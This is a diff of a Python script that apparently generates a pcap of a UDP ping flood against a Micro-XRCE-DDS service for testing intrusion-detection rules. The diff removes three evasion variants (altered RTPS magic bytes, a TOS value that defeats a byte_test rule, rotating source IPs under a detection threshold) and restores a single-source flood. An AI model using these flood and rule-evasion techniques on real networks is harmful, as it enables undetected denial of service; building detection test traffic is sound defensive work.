@@ -28,7 +28,7 @@ from pathlib import Path
 # --- MUTABLE PARAMETERS (evasion knobs) -----------------------------------
 # H2 (library fingerprint): the RTPS magic + version + vendor id identify the
 # microxrcedds_client library. An evasion variant may alter these bytes.
-RTPS_MAGIC = b"XXXX"          # EVASION: changed from "RTPS" to defeat content:"RTPS" rule
+RTPS_MAGIC = b"RTPS"          # protocol fingerprint an IDS keys on: |52 54 50 53|
 PROTO_VERSION = b"\x02\x01"   # RTPS 2.1
 VENDOR_ID = b"\x01\x0f"       # eProsima / Micro-XRCE vendor id
 GUID_PREFIX = bytes.fromhex("0102030405060708090a0b0c")  # 12-byte client GUID
@@ -36,13 +36,7 @@ PING_SUBMSG_ID = 0x0B         # XRCE PING submessage id
 
 # H1 (single source): the whole flood comes from one source IP/port. An evasion
 # variant may spread the source (spoofing) — see the playbook's H1 catalogue.
-SRC_IPS = [
-    "10.13.37.66",
-    "10.13.37.67",
-    "10.13.37.68",
-    "10.13.37.69",
-    "10.13.37.70",
-]
+SRC_IP = "10.13.37.66"
 SRC_PORT = 45000
 # --------------------------------------------------------------------------
 
@@ -61,8 +55,7 @@ def _udp_frame(src_ip: str, dst_ip: str, sport: int, dport: int, payload: bytes)
     udp_len = 8 + len(payload)
     udp = struct.pack("!HHHH", sport, dport, udp_len, 0) + payload  # csum 0 (valid for IPv4)
     ip_len = 20 + udp_len
-    # EVASION: set TOS=0x02 so byte_test:1,<,2,1 on IP header fails (0x02 is not < 2)
-    ip = struct.pack("!BBHHHBBH", 0x45, 0x02, ip_len, 0x1234, 0, 64, 17, 0)
+    ip = struct.pack("!BBHHHBBH", 0x45, 0, ip_len, 0x1234, 0, 64, 17, 0)
     ip += socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
     ip = ip[:10] + struct.pack("!H", _ip_checksum(ip)) + ip[12:]
     return eth + ip + udp
@@ -100,13 +93,10 @@ def main() -> int:
     pcap_path = out_dir / "attack.pcap"
 
     # Flood: num_packets datagrams spaced 5 ms apart -> a burst well inside 1 s.
-    # EVASION: spread across multiple source IPs so no single src reaches
-    # detection_filter threshold (count 50, seconds 5).
     frames: list[tuple[int, int, bytes]] = []
     for seq in range(num_packets):
-        src_ip = SRC_IPS[seq % len(SRC_IPS)]
         payload = _xrce_ping(seq, payload_size)
-        frame = _udp_frame(src_ip, target_ip, SRC_PORT, target_port, payload)
+        frame = _udp_frame(SRC_IP, target_ip, SRC_PORT, target_port, payload)
         ts_usec = (seq * 5000) % 1_000_000
         ts_sec = (seq * 5000) // 1_000_000
         frames.append((ts_sec, ts_usec, frame))
@@ -114,7 +104,7 @@ def main() -> int:
 
     print(
         f"xrce-dds-udp-dos: flooded {target_ip}:{target_port} with {num_packets} "
-        f"RTPS ping datagrams ({payload_size} B each) from {len(SRC_IPS)} rotating sources "
+        f"RTPS ping datagrams ({payload_size} B each) from single source {SRC_IP} "
         f"-> wrote {pcap_path}"
     )
     return 0
